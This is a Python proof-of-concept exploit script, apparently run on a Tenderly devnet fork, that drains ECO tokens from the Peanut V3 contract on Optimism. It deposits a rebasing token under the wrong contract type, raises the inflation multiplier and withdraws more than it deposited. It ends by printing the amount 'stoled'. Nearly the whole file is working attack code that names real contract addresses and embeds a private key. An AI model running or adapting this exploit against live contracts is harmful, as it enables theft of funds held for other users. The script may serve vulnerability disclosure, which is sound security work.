import json
from typing import cast
from eth_typing import ChecksumAddress
from web3 import Web3, HTTPProvider, Account
from eth_account.signers.local import LocalAccount
from eth_keys.main import PrivateKey
from eth_abi.encoding import PackedAddressEncoder
from eth_account.datastructures import SignedMessage

OPTIMISM_TENDERLY_RPC = 'https://rpc.vnet.tenderly.co/devnet/peanut-eco-hack/db06ef19-bcc6-4e7a-bcbd-7d86375b2ddf'
web3 = Web3(HTTPProvider(OPTIMISM_TENDERLY_RPC))

INFINITE_AMOUNT = 2 ** 256 - 1

DRAINER_PRIVATE_KEY = PrivateKey(bytes.fromhex('d099c094ef05e1cca1bc881f9d9fe6950abc3b1f9823b7ed72f005cfc503cb6b'))
drainer_account: LocalAccount = LocalAccount(DRAINER_PRIVATE_KEY, Account)
assert drainer_account.address == '0xEE3669Af770A3E08e29e01208a37f71D65d6A5C6'  # Hard-coding the address just for readability

ECO_ADDRESS = cast(ChecksumAddress, '0xe7BC9b3A936F122f08AAC3b1fac3C3eC29A78874')
PEANUT_V3_ADDRESS = cast(ChecksumAddress, '0xEA9E5A64ED3F892baD4b477709846b819013dEFC')
ECO_REBASER = cast(ChecksumAddress, '0xAa029BbdC947F5205fBa0F3C11b592420B58f824')  # Address that is allowed to change inflation multiplier

with open('./eco_abi.json') as f:
    ECO_ABI = json.loads(f.read())

with open('./peanut_v3_abi.json') as f:
    PEANUT_V3_ABI = json.loads(f.read())

eco_contract = web3.eth.contract(address=ECO_ADDRESS, abi=ECO_ABI)
peanut_v3_contract = web3.eth.contract(PEANUT_V3_ADDRESS, abi=PEANUT_V3_ABI)

print('Check that there are some ECO deposits in the peanut contract')
MINIMUM_INITIAL_PEANUT_BALANCE = int(140_000 * 1e18)  # Amount of ECO that Peanut contract currently stores
initial_peanut_balance = eco_contract.functions.balanceOf(peanut_v3_contract.address).call()
print('Initial peanut balance', initial_peanut_balance)
assert initial_peanut_balance >= MINIMUM_INITIAL_PEANUT_BALANCE

EXPECTED_INITIAL_INFLATION = 1025431206640282416  # Current ECO inflation multiplier on Optimism
print('Check that current ECO inflation is the expected one')
initial_inflation = eco_contract.functions.linearInflationMultiplier().call()
assert initial_inflation == EXPECTED_INITIAL_INFLATION

print('Give 10 million ECO tokens to the drainer')
web3.provider.make_request('tenderly_setStorageAt', [eco_contract.address, '0x6e6a3b82756e0c0c23843c744902b894f85104238c753bb471d0c53bde55002e', '0x000000000000000000000000000072cb5bd86321e38cb6ce6682e80000000000'])  # type: ignore
initial_drainer_balance = eco_contract.functions.balanceOf(drainer_account.address).call()
print('Initial drainer balance', initial_drainer_balance)
assert initial_drainer_balance / 1e18 == 10_000_000 / initial_inflation * 1e18  # Yes, due to how ECO handles inflation, we have to take 1e18 into account twice

print('Give some ETH to the drainer to execute transactions')
web3.provider.make_request('tenderly_setBalance', [drainer_account.address, hex(int(1e18))])  # type: ignore
drainer_eth_balance = web3.eth.get_balance(drainer_account.address) # type: ignore
assert drainer_eth_balance == int(1e18)

print('Approve Peanut to spend drainer ECO tokens')
nonce = web3.eth.get_transaction_count(drainer_account.address) # type: ignore
tx_params = eco_contract.functions.approve(
    peanut_v3_contract.address,
    INFINITE_AMOUNT,
).build_transaction({
    'from': drainer_account.address,
    'nonce': nonce
})
signed_tx = drainer_account.sign_transaction(tx_params)
response = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
web3.eth.wait_for_transaction_receipt(response)

print('Make a drainer Peanut deposit')
nonce = web3.eth.get_transaction_count(drainer_account.address) # type: ignore
tx_params = peanut_v3_contract.functions.makeDeposit(
    eco_contract.address,
    1,  # !!!!!!!!!!!!!!!!!!!! MAIN PART. Using 1 as contract type for ECO instead of usual 5.
    initial_drainer_balance,
    0,
    drainer_account.address
).build_transaction({
    'from': drainer_account.address,
    'nonce': nonce
})
signed_tx = drainer_account.sign_transaction(tx_params)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
web3.eth.wait_for_transaction_receipt(tx_hash)
deposited_peanut_balance = eco_contract.functions.balanceOf(peanut_v3_contract.address).call()
print('Peanut balance after deposit', deposited_peanut_balance)

print('Increase inflation multiplier by 1%')
new_inflation = initial_inflation + int(0.01 * 1e18)
tx_params = eco_contract.functions.rebase(new_inflation).build_transaction({
    'from': ECO_REBASER,
})
# Since we use a tenderly devnet, we can cheat and send an unsigned tx on behalf of ECO_REBASER
tx_hash = web3.eth.send_transaction(tx_params)
web3.eth.wait_for_transaction_receipt(tx_hash)
updated_inflation = eco_contract.functions.linearInflationMultiplier().call()
print('Updated inflation', updated_inflation)
assert updated_inflation == new_inflation

deposit_count = peanut_v3_contract.functions.getDepositCount().call()
latest_deposit_idx = deposit_count - 1
print('Latest deposit index', latest_deposit_idx)
print('Drainer account address', drainer_account.address)

encoder = PackedAddressEncoder()
packed_drainer_address = encoder.encode(drainer_account.address)

hashed_packed_drainer_address = web3.keccak(b'\x19Ethereum Signed Message:\n32' + web3.keccak(packed_drainer_address))
print('Hached packed drainer address', hashed_packed_drainer_address.hex())

signed_message: SignedMessage = drainer_account.signHash(hashed_packed_drainer_address)
signature = bytes(signed_message.signature)
print('Signature', signature.hex())

tx_params = peanut_v3_contract.functions.withdrawDeposit(
    latest_deposit_idx,
    drainer_account.address,
    hashed_packed_drainer_address,
    signature
).build_transaction({
    'from': drainer_account.address
})
signed_tx = drainer_account.sign_transaction(tx_params)
response = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
web3.eth.wait_for_transaction_receipt(response)

altered_peanut_balance = eco_contract.functions.balanceOf(peanut_v3_contract.address).call()
print('Altered Peanut Balance', altered_peanut_balance)

inflation_adjuted_initial_balance = initial_peanut_balance / EXPECTED_INITIAL_INFLATION
inflation_adjusted_altered_balance = altered_peanut_balance / updated_inflation
print(f'We have just stoled {inflation_adjuted_initial_balance - inflation_adjusted_altered_balance} ECO tokens :)))')
